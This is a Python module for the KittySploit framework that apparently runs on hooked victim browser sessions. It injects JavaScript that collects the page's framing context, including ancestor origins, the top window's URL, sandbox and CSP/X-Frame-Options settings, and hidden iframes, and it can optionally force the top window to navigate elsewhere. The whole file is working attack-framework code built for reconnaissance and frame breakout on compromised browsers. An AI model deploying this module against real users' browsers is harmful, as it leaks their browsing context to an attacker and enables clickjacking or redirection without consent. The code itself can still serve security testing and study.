from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Frame Ancestors / Breakout Probe",
		"description": "Detect framing context, ancestor origins, sandboxing, and breakout/clickjacking signals",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	try_breakout = OptBool(
		False,
		"Attempt top.location navigation breakout (may navigate the top window)",
		False,
	)
	breakout_url = OptString(
		"",
		"URL for breakout attempt (empty = current page URL)",
		False,
	)

	def run(self):
		try_breakout = self._to_bool(self.try_breakout)
		breakout_url = str(self.breakout_url or "").strip()

		code_js = f"""
		(function() {{
			const TRY_BREAKOUT = {str(try_breakout).lower()};
			const BREAKOUT_URL = {json.dumps(breakout_url)};

			const out = {{
				ok: true,
				page_url: location.href,
				origin: location.origin,
				is_framed: window.top !== window.self,
				frame_element: !!window.frameElement,
				ancestor_origins: [],
				ancestor_origins_supported: !!(location.ancestorOrigins),
				same_origin_top: null,
				top_href: null,
				top_origin: null,
				parent_origin: null,
				sandbox: null,
				csp_frame_ancestors_meta: [],
				xfo_meta: [],
				iframes_on_page: [],
				clickjacking_hints: [],
				breakout: null,
				notes: []
			}};

			try {{
				if (location.ancestorOrigins) {{
					out.ancestor_origins = Array.from(location.ancestorOrigins);
				}}
			}} catch (e) {{
				out.notes.push('ancestorOrigins error: ' + (e.message || String(e)));
			}}

			try {{
				out.top_href = window.top.location.href;
				out.top_origin = window.top.location.origin;
				out.same_origin_top = true;
			}} catch (e) {{
				out.same_origin_top = false;
				out.notes.push('top.location blocked (cross-origin frame)');
			}}

			try {{
				out.parent_origin = window.parent.location.origin;
			}} catch (e) {{
				out.parent_origin = null;
			}}

			try {{
				if (window.frameElement) {{
					out.sandbox = window.frameElement.getAttribute('sandbox');
					out.frame_src = window.frameElement.getAttribute('src');
					out.frame_name = window.frameElement.getAttribute('name');
				}}
			}} catch (e) {{}}

			try {{
				document.querySelectorAll('meta[http-equiv]').forEach(function(meta) {{
					const equiv = (meta.getAttribute('http-equiv') || '').toLowerCase();
					const content = meta.getAttribute('content') || '';
					if (equiv === 'content-security-policy' && /frame-ancestors/i.test(content)) {{
						out.csp_frame_ancestors_meta.push(content);
					}}
					if (equiv === 'x-frame-options') {{
						out.xfo_meta.push(content);
					}}
				}});
			}} catch (e) {{}}

			try {{
				document.querySelectorAll('iframe').forEach(function(frame, idx) {{
					out.iframes_on_page.push({{
						index: idx,
						src: frame.getAttribute('src') || '',
						sandbox: frame.getAttribute('sandbox'),
						allow: frame.getAttribute('allow'),
						width: frame.width || frame.clientWidth,
						height: frame.height || frame.clientHeight,
						opacity: (frame.style && frame.style.opacity) || null
					}});
				}});
			}} catch (e) {{}}

			if (out.is_framed) {{
				out.clickjacking_hints.push('Page is framed by another window');
				if (out.same_origin_top === false) {{
					out.clickjacking_hints.push('Cross-origin parent — classic clickjacking / UI redress host');
				}}
				if (out.sandbox != null) {{
					out.clickjacking_hints.push('Framed with sandbox attribute: ' + JSON.stringify(out.sandbox));
				}}
			}} else {{
				out.clickjacking_hints.push('Not framed (top-level browsing context)');
			}}

			const opaqueIframes = (out.iframes_on_page || []).filter(function(f) {{
				const op = f.opacity == null ? null : parseFloat(f.opacity);
				return op !== null && !isNaN(op) && op < 0.1;
			}});
			if (opaqueIframes.length) {{
				out.clickjacking_hints.push('Near-invisible iframes present on page: ' + opaqueIframes.length);
			}}

			if (TRY_BREAKOUT && out.is_framed) {{
				const dest = BREAKOUT_URL || location.href;
				try {{
					window.top.location = dest;
					out.breakout = {{ attempted: true, ok: true, url: dest }};
				}} catch (e) {{
					out.breakout = {{
						attempted: true,
						ok: false,
						url: dest,
						error: e.message || String(e)
					}};
				}}
			}} else if (TRY_BREAKOUT) {{
				out.breakout = {{ attempted: false, reason: 'not framed' }};
			}}

			return JSON.stringify(out);
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=15.0)
		if not result:
			print_error("Failed to run frame ancestors probe")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Frame Ancestors / Breakout Probe")
		print_info(f"  Page: {data.get('page_url')}")
		print_info(f"  Framed: {data.get('is_framed')}")
		print_info(f"  Same-origin top: {data.get('same_origin_top')}")

		if data.get("ancestor_origins_supported"):
			origins = data.get("ancestor_origins") or []
			print_info(f"  ancestorOrigins ({len(origins)}): {', '.join(origins) if origins else '(none)'}")
		else:
			print_status("  location.ancestorOrigins not supported in this browser")

		if data.get("top_href"):
			print_info(f"  top.href: {data.get('top_href')}")
		if data.get("sandbox") is not None:
			print_warning(f"  sandbox: {data.get('sandbox')!r}")

		if data.get("csp_frame_ancestors_meta"):
			print_info(f"  CSP frame-ancestors (meta): {data['csp_frame_ancestors_meta']}")
		if data.get("xfo_meta"):
			print_info(f"  X-Frame-Options (meta): {data['xfo_meta']}")

		iframes = data.get("iframes_on_page") or []
		print_info(f"  Child iframes on page: {len(iframes)}")
		for frame in iframes[:15]:
			print_info(f"    [{frame.get('index')}] {frame.get('src') or '(empty)'} sandbox={frame.get('sandbox')!r}")

		print_info("-" * 60)
		for hint in data.get("clickjacking_hints") or []:
			print_warning(f"  {hint}")

		br = data.get("breakout")
		if br:
			if br.get("ok"):
				print_success(f"  Breakout attempted -> {br.get('url')}")
			elif br.get("attempted"):
				print_error(f"  Breakout failed: {br.get('error')}")
			else:
				print_info(f"  Breakout skipped: {br.get('reason')}")

		for note in data.get("notes") or []:
			print_info(f"  Note: {note}")
		return True
